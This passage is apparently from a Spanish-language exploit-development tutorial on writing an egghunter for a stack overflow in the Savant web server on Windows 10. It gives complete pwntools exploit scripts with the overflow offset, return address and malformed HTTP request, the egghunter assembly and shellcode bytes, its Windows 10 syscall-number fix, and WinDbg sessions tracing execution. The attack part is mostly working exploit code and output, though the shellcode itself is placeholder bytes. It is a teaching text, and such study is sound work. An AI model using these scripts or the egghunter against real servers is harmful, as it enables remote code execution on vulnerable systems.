cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0427ea8d 41              inc     ecx

</span><span class="ro">0:000> </span><span class="p">db eip L100
0427ea8d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427ea9d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eaad  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eabd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eacd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eadd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eaed  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eafd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb0d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb1d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb2d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb3d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb4d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb5d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb6d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0427eb7d  41 41 41 41 41 41 41 41-41 41 41 41 41 74 86 41  AAAAAAAAAAAAAt.A  </span>
</code></pre></div></div><br>

</section>

<section class="post" id="egg">
<br><h3 class="post-title">6.5 - EggHunter</h3><br>

<p class="plain-text">Lo primero que necesitamos para poder utilizar un egghunter es almacenar un <code class="language-plaintext highlighter-rouge">shellcode</code> de tamaño normal en alguna parte de la memoria, no importa si no conocemos la dirección, para poder encontrarlo facilmente enviaremos la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> antes de las <code class="language-plaintext highlighter-rouge">C's</code>, la pregunta es ¿donde lo enviamos? podemos reversear el programa para buscar un lugar o siguiendo la lógica si hacemos una petición podemos enviar una <code class="language-plaintext highlighter-rouge">data</code> y tal vez se guarde en algun lugar de la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"w00tw00t"</span><span class="p">
shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

method  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="p">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  
content </span><span class="o">+= </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit podemos buscar la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code>, en toda la memoria dentro del rango <code class="language-plaintext highlighter-rouge">user-mode</code>, nuestros bytes están en la dirección <code class="language-plaintext highlighter-rouge">0x047c8183</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">s -a 0 L?80000000 w00tw00t
047c8183  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC  

</span><span class="ro">0:000></span><span class="p"> db 0x047c8183
047c8183  77 30 30 74 77 30 30 74-43 43 43 43 43 43 43 43  w00tw00tCCCCCCCC  
047c8193  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81a3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81b3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81c3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81d3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81e3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  
047c81f3  43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC  </span>
</code></pre></div></div><br>

<p class="plain-text">Esta dirección parece ser parte del <code class="language-plaintext highlighter-rouge">heap</code> por lo que es complicado hacer un stack pivot o encontrar una forma de calcular donde esta el shellcode, pero esta ahi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!address 0x047c8183
                                     
Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

Usage:                  Heap
Base Address:           047c0000
End Address:            047d5000
Region Size:            00015000 (  84.000 kB)
State:                  00001000          MEM_COMMIT
Protect:                00000004          PAGE_READWRITE
Type:                   00020000          MEM_PRIVATE
Allocation Base:        047c0000
Allocation Protect:     00000004          PAGE_READWRITE
More info:              heap owning the address: !heap -s -h 0x2210000
More info:              heap segment
More info:              heap entry containing the address: !heap -x 0x47c8183  

Content source: 1 (target), length: ce7d</span>
</code></pre></div></div><br>

<p class="plain-text">La utilidad mona integra un egghunter probablemente basado en el siguiente <a href="https://hick.org/code/skape/papers/egghunt-shellcode.pdf">paper</a>, sin embargo si lo ejecutamos este fallará, enseguida analizaremos el porque</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona egghunter
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py egghunter
[+] Egg set to w00t
[+] Generating traditional 32bit egghunter code
[+] Preparing output file 'egghunter.txt'
    - (Re)setting logfile C:\mona\egghunter.txt
[+] Egghunter  (33 bytes): 
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74" 
"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"  </span>
</code></pre></div></div><br>

<p class="plain-text">Al desensamblar el <code class="language-plaintext highlighter-rouge">egghunter</code> podriamos ver algo asi, inicia obteniendo en <code class="language-plaintext highlighter-rouge">edx</code> la ultima dirección de la página y saltando a la siguiente incrementando el registro en una unidad, luego guarda el valor actual de edx en el <code class="language-plaintext highlighter-rouge">stack</code> para no perderlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">.</span><span class="na">page</span><span class="p">:
    </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff</span><span class="c1">        ; get last address in page  
</span><span class="o">.</span><span class="na">find</span><span class="p">:
    </span><span class="o">inc </span><span class="mi">edx</span><span class="c1">             ; increase memory counter
    </span><span class="o">push </span><span class="mi">edx</span><span class="c1">            ; push value to stack</span>
</code></pre></div></div><br>

<p class="plain-text">Después mueve al registro eax el valor <code class="language-plaintext highlighter-rouge">0x2</code> que simboliza a la función <code class="language-plaintext highlighter-rouge">NtAccessCheckAndAuditAlarm</code> para despues ejecutar <code class="language-plaintext highlighter-rouge">int 0x2e</code> que cambia el modo de usuario a kernel generando asi una <code class="language-plaintext highlighter-rouge">syscall</code> que ejecutará la función, esta función la utiliza para evitar violaciones de acceso en tiempo de ejecución, de esta forma comprueba si la página donde apunta edx es válida antes de ejecutar instrucciones</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    push </span><span class="mi">0x2</span><span class="c1">            ; push NtAccessCheckAndAuditAlarm
    </span><span class="o">pop </span><span class="mi">eax</span><span class="c1">             ; $eax = NtAccessCheckAndAuditAlarm  
    </span><span class="o">int </span><span class="mi">0x2e</span><span class="c1">            ; system call</span>
</code></pre></div></div><br>

<p class="plain-text">La llamada a esta función se usa para comprobar que la página sea válida evitando asi violaciones de acceso en siguientes instrucciones, cuando la página no es valida la función devuelve el valor en <code class="language-plaintext highlighter-rouge">eax</code> y si es <code class="language-plaintext highlighter-rouge">0xc0000005</code> nos indica que no existe</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5</span><span class="c1">         ; check ACCESS_VIOLATION (0xc0000005)  </span>
</code></pre></div></div><br>

<p class="plain-text">Después de eso restauramos el valor de <code class="language-plaintext highlighter-rouge">edx</code> que guardamos y si el valor devuelto es <code class="language-plaintext highlighter-rouge">0xc0000005</code> volvemos al inicio para aumentar la <code class="language-plaintext highlighter-rouge">página</code> hasta que sea valida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    pop </span><span class="mi">edx</span><span class="c1">             ; restore edx
    </span><span class="o">jz .</span><span class="na">page</span><span class="c1">            ; if zf == 1 -> next page  </span>
</code></pre></div></div><br>

<p class="plain-text">Una vez que es válida guarda en <code class="language-plaintext highlighter-rouge">eax</code> la cadena <code class="language-plaintext highlighter-rouge">w00t</code> en hexadecimal y en <code class="language-plaintext highlighter-rouge">edi</code> la dirección que tiene actualmente <code class="language-plaintext highlighter-rouge">edx</code> para poder ser comparados mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
    </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx</span><span class="c1">        ; $edi = address  </span>
</code></pre></div></div><br>

<p class="plain-text">Luego de eso usa <code class="language-plaintext highlighter-rouge">scasd</code> para comparar si los bytes que se encuentran en <code class="language-plaintext highlighter-rouge">[edi]</code> sean iguales a la cadena <code class="language-plaintext highlighter-rouge">w00t</code>, esto lo hace 2 veces, ¿porque <code class="language-plaintext highlighter-rouge">w00tw00t</code> y no solo <code class="language-plaintext highlighter-rouge">w00t</code>? porque esos <code class="language-plaintext highlighter-rouge">4</code> bytes podrian aparecer varias veces dando asi falsos positivos, si la comparación no es igual aumenta la dirección en una unidad hasta que sea válida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    scasd               </span><span class="c1">; cmp eax, [edi]
    </span><span class="o">jnz .</span><span class="na">find</span><span class="c1">           ; if zf == 0 -> loop  

    </span><span class="o">scasd</span><span class="c1">               ; cmp eax, [edi]
    </span><span class="o">jnz .</span><span class="na">find</span><span class="c1">           ; if zf == 0 -> loop  </span>
</code></pre></div></div><br>

<p class="plain-text">Cuando la comparación se haga 2 veces quiere decir que valido la cadena <code class="language-plaintext highlighter-rouge">w00tw00t</code> enviada antes del <code class="language-plaintext highlighter-rouge">shellcode</code> y lo que esta despues es este por lo que salta ahi</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    jmp </span><span class="mi">edi</span><span class="c1">             ; if zf == 1 -> exec  </span>
</code></pre></div></div><br>

<p class="plain-text">El cógigo del <code class="language-plaintext highlighter-rouge">egghunter</code> se ve algo asi, lo podemos compilar con <code class="language-plaintext highlighter-rouge">nasm</code> y <code class="language-plaintext highlighter-rouge">ld</code>, para obtenerlo en el formato que necesitamos para python usaremos <code class="language-plaintext highlighter-rouge">objdump</code> y regex</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff</span><span class="c1">        ; get last address in page

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx</span><span class="c1">             ; increase memory counter
        </span><span class="o">push </span><span class="mi">edx</span><span class="c1">            ; push value to stack
        </span><span class="o">push </span><span class="mi">0x2</span><span class="c1">            ; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax</span><span class="c1">             ; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">int </span><span class="mi">0x2e</span><span class="c1">            ; system call
        </span><span class="o">cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5</span><span class="c1">         ; check ACCESS_VIOLATION (0xc0000005)  

        </span><span class="o">pop </span><span class="mi">edx</span><span class="c1">             ; restore edx
        </span><span class="o">jz .</span><span class="na">page</span><span class="c1">            ; if zf == 1 -> next page

        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx        </span><span class="c1">; $edi = address

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi             </span><span class="c1">; if zf == 1 -> exec</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ nasm </span><span class="p">-f elf egghunter.asm -o egghunter.o
</span><span class="ve">❯ ld </span><span class="p">egghunter.o -m elf_i386 -o egghunter

</span><span class="ve">❯ objdump </span><span class="p">-d egghunter | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -v </span><span class="am">'egghunter' </span><span class="p">|</span><span class="ve"> cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-6 -d</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="p">-s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr </span><span class="am">'\t' ' ' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d </span><span class="am">'' </span><span class="p">-s  
\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7  </span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro exploit ahora se puede ver asi, al ejecutar el <code class="language-plaintext highlighter-rouge">pop eax; ret;</code> volverá al jmp corto que saltara al <code class="language-plaintext highlighter-rouge">egghunter</code> que buscara el shellcode que son <code class="language-plaintext highlighter-rouge">C's</code> en la memoria</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

egg </span><span class="o">= </span><span class="no">b</span><span class="s">"w00t" </span><span class="o">* </span><span class="mi">2</span><span class="p">
egghunter </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7</span><span class="s">"  </span><span class="p">

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> (offset </span><span class="o">- </span><span class="no">len</span><span class="p">(egghunter))

shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">300</span><span class="p">

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload </span><span class="o">+= </span><span class="p">egghunter
payload </span><span class="o">+= </span><span class="p">junk
payload </span><span class="o">+= </span><span class="p">ret

method </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)

content  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
content </span><span class="o">+= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">
content </span><span class="o">+= </span><span class="p">egg </span><span class="o">+ </span><span class="p">shellcode

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Para ver su funcionamiento y porque falla enviamos el <code class="language-plaintext highlighter-rouge">exploit</code> y nos detenemos después del salto corto y justo antes de iniciar a ejecutar todo el <code class="language-plaintext highlighter-rouge">egghunter</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=00418674 esp=0388ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0388fe60 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=00418675 esp=0388ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0388fe60 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=0388ea74 esp=0388ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0388ea74 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=0388ea76 esp=0388ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0388ea76 7e15            jle     0388ea8d                                [br=1]  

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c
eip=0388ea8d esp=0388ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0388ea8d 6681caff0f      or      dx,0FFFh</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en el eip podemos ver el egghunter, ya que entendimos el funcionamiento establecemos el breakpoint en <code class="language-plaintext highlighter-rouge">0x0388eaab</code> antes de que salte al shellcode</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u eip L10
0388ea8d 6681caff0f      or      dx,0FFFh
0388ea92 42              inc     edx
0388ea93 52              push    edx
0388ea94 6a02            push    2
0388ea96 58              pop     eax
0388ea97 cd2e            int     2Eh
0388ea99 3c05            cmp     al,5
0388ea9b 5a              pop     edx
0388ea9c 74ef            je      0388ea8d
0388ea9e b877303074      mov     eax,74303077h
0388eaa3 89d7            mov     edi,edx
0388eaa5 af              scas    dword ptr es:[edi]  
0388eaa6 75ea            jne     0388ea92
0388eaa8 af              scas    dword ptr es:[edi]  
0388eaa9 75e7            jne     0388ea92
0388eaab ffe7            jmp     edi

</span><span class="ro">0:000> </span><span class="p">bp 0x0388eaab

</span><span class="ro">0:000> </span><span class="p">g</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al ejecutarlo usa todos los recursos para buscar <code class="language-plaintext highlighter-rouge">w00tw00t</code> en toda la memoria pero por alguna razón extraña nunca lo hace aunque se encuentra ahi</p>
<a href="/exploitdevelopment/user-mode/egghunters/1.png" target="_blank"><div><p><img src="/exploitdevelopment/user-mode/egghunters/1.png"></p></div></a>

</section>

<section class="post" id="win10">
<br><h3 class="post-title">6.6 - EggHunter win10</h3><br>

<p class="plain-text">¿Cual es el problema? hasta <code class="language-plaintext highlighter-rouge">Windows 8</code> la función <code class="language-plaintext highlighter-rouge">NtAccessCheckAndAuditAlarm</code> tuvo el mismo syscall NR que es <code class="language-plaintext highlighter-rouge">0x2</code> sin embargo en <code class="language-plaintext highlighter-rouge">Windows 10</code> este cambia constantemente con cada actualización, la solución es buscar el syscall NR especifico para tu version de Windows o aprovechando que estamos en <code class="language-plaintext highlighter-rouge">windbg</code> podemos verlo desde el modulo ntdll, para esta versión especifica de Windows es <code class="language-plaintext highlighter-rouge">0x1c6</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u ntdll!NtAccessCheckAndAuditAlarm
ntdll!NtAccessCheckAndAuditAlarm:
778420c0 b8c9010000      mov     eax,1C6h
778420c5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (778420cd)  
778420ca c22c00          ret     2Ch
778420cd 8bd4            mov     edx,esp
778420cf 0f34            sysenter
778420d1 c3              ret
778420d2 8da42400000000  lea     esp,[esp]
778420d9 8da42400000000  lea     esp,[esp]</span>
</code></pre></div></div><br>

<p class="plain-text">La solución es simple, cambiamos el syscall NR en eax de <code class="language-plaintext highlighter-rouge">0x2</code> a <code class="language-plaintext highlighter-rouge">0x1c6</code>, esto tenemos que hacerlo de una forma que evitemos los <code class="language-plaintext highlighter-rouge">null bytes</code> en el egghunter</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">push </span><span class="mi">0x2
</span><span class="o">pop </span><span class="mi">eax</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax
</span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x1c6</span>
</code></pre></div></div><br>

<p class="plain-text">De forma opcional podemos setear el registro <code class="language-plaintext highlighter-rouge">edx</code> a 0 al inicio para partir desde la dirección <code class="language-plaintext highlighter-rouge">0x0</code>, esto puede reducir el tiempo de espera significativamente</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">xor </span><span class="mi">edx</span><span class="p">, </span><span class="mi">edx</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora el codigo del <code class="language-plaintext highlighter-rouge">egghunter</code> se ve de esta forma, aunque después de estas modificaciones el peso en <code class="language-plaintext highlighter-rouge">bytes</code> aumento un poco ahora deberia funcionar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">xor </span><span class="mi">edx</span><span class="p">, </span><span class="mi">edx            </span><span class="c1">; $edx = 0x0

    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff        </span><span class="c1">; get last address in page

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx             </span><span class="c1">; increase memory counter
        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack
        </span><span class="o">xor </span><span class="mi">eax</span><span class="p">, </span><span class="mi">eax        </span><span class="c1">; $eax = 0x0
        </span><span class="o">mov </span><span class="mi">ax</span><span class="p">, </span><span class="mi">0x1c6       </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">int </span><span class="mi">0x2e            </span><span class="c1">; system call
        </span><span class="o">cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5</span><span class="c1">         ; check ACCESS_VIOLATION (0xc0000005)  

        </span><span class="o">pop </span><span class="mi">edx             </span><span class="c1">; restore edx
        </span><span class="o">jz .</span><span class="na">page            </span><span class="c1">; if zf == 1 -> next page

        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx        </span><span class="c1">; $edi = address

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi             </span><span class="c1">; if zf == 1 -> exec</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ objdump </span><span class="p">-d egghunter | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:'</span><span class="p"> | </span><span class="ve">grep</span><span class="p"> -v </span><span class="am">'egghunter' </span><span class="p">|</span><span class="ve"> cut </span><span class="p">-f2 -d: | </span><span class="ve">cut</span><span class="p"> -f1-6 -d</span><span class="am"> ' ' </span><span class="p">| </span><span class="ve">tr </span><span class="p">-s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr </span><span class="am">'\t' ' ' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d </span><span class="am">'' </span><span class="p">-s  
\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\xb8\xc9\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7</span>
</code></pre></div></div><br>

<p class="plain-text">Repasemos, modificamos el egghunter original para hacerlo funcionar en la ultima versión de <code class="language-plaintext highlighter-rouge">Windows 10</code>, ya que lo tenemos nos daremos un tiempo para entender como funciona viendo las instrucciones y comportamiento desde el debugger</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u eip L11
01c8ea8d 31d2            xor     edx,edx
01c8ea8f 6681caff0f      or      dx,0FFFh
01c8ea94 42              inc     edx
01c8ea95 52              push    edx
01c8ea96 31c0            xor     eax,eax
01c8ea98 66b8c901        mov     ax,1C6h
01c8ea9c cd2e            int     2Eh
01c8ea9e 3c05            cmp     al,5
01c8eaa0 5a              pop     edx
01c8eaa1 74ea            je      01c8ea8f
01c8eaa3 b877303074      mov     eax,74303077h
01c8eaa8 89d7            mov     edi,edx
01c8eaaa af              scas    dword ptr es:[edi]  
01c8eaab 75e7            jne     01c8ea94
01c8eaad af              scas    dword ptr es:[edi]  
01c8eaae 75e4            jne     01c8ea94
01c8eab0 ffe7            jmp     edi</span>
</code></pre></div></div><br>

<p class="plain-text">El egghunter inicia seteando el registro <code class="language-plaintext highlighter-rouge">edx</code> en <code class="language-plaintext highlighter-rouge">0</code>, obtiene la ultima pagina e incrementa edx en una unidad, el valor final de edx es <code class="language-plaintext highlighter-rouge">0x1000</code>, y esta sera la cantidad que aumentara en cada vuelta hsata comprobar si la dirección es válida</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=018f2aa8 ecx=0000000e edx=77842990 esi=018f2aa8 edi=0041703c  
